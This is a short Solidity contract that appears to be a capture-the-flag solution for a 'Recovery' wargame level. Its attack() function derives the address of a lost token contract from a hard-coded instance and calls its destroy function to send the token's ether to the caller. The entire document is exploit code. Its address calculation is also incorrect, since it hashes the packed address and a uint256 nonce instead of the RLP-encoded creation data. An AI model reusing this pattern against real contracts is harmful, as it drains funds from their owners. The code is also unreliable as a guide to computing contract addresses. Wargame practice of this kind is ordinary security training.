pragma solidity ^0.8.0;

contract RecoverySolver {
    address public recoveryInstance = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;

    function attack() public {
        address token = address(uint160(uint256(keccak256(abi.encodePacked(recoveryInstance, uint256(1))))));
        (bool success, ) = token.call(abi.encodeWithSignature("destroy(address)", msg.sender));
        require(success);
    }
}
